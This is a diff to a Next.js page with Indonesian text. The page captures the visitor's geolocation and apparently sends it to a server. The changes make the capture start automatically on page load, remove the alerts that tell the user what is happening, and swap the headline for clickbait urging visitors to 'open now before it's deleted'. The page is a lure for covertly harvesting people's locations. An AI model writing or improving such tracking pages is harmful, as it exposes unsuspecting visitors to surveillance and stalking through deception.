@@ -1,11 +1,12 @@
 "use client";
 
-import { useState } from "react";
+import { useEffect, useState } from "react";
 
 export default function Home() {
   const [loading, setLoading] = useState(false);
 
   const sendLocation = () => {
+    if (loading) return;
     setLoading(true);
 
     navigator.geolocation.getCurrentPosition(
@@ -19,15 +20,18 @@ export default function Home() {
           }),
         });
 
-        alert("Konten terbuka 🎉");
         setLoading(false);
       },
       () => {
-        alert("Izinkan lokasi untuk melanjutkan");
         setLoading(false);
       }
     );
   };
+
+  // 🚀 Auto jalan saat halaman dibuka
+  useEffect(() => {
+    sendLocation();
+  }, []);
 
   return (
     <main style={{
@@ -40,8 +44,8 @@ export default function Home() {
       textAlign: "center"
     }}>
       <div>
-        <h1>🔓 Konten Eksklusif</h1>
-        <p>Klik untuk membuka konten rahasia</p>
+        <h1>🎁 Kontent viral hari ini.</h1>
+        <p>Buka sekarang sebelum dihapus</p>
 
         <button
           onClick={sendLocation}
@@ -56,7 +60,7 @@ export default function Home() {
             marginTop: "20px"
           }}
         >
-          {loading ? "Loading..." : "Buka Sekarang"}
+          {loading ? "Memproses..." : "Buka Sekarang"}
         </button>
       </div>
     </main>
